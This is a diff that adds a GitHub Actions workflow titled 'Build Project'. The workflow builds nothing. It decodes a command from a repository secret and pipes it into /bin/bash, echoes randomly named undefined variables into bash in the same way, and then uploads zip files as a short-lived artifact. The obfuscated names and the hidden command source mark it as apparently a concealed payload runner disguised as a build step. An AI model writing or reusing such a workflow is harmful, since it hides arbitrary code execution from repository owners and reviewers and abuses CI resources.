@@ -1,0 +1,28 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          m88: ${{ secrets.m88 }}
+        run: |
+          printf '%s' "$m88" | jq -r .a39 | /bin/bash
+          echo $fpweg33835 | jq -r .fion0928 | /bin/bash
+          echo $xg085 | jq -r .ntuvi32 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: sr8lghd2
+          path: "*.zip"
+          retention-days: 1
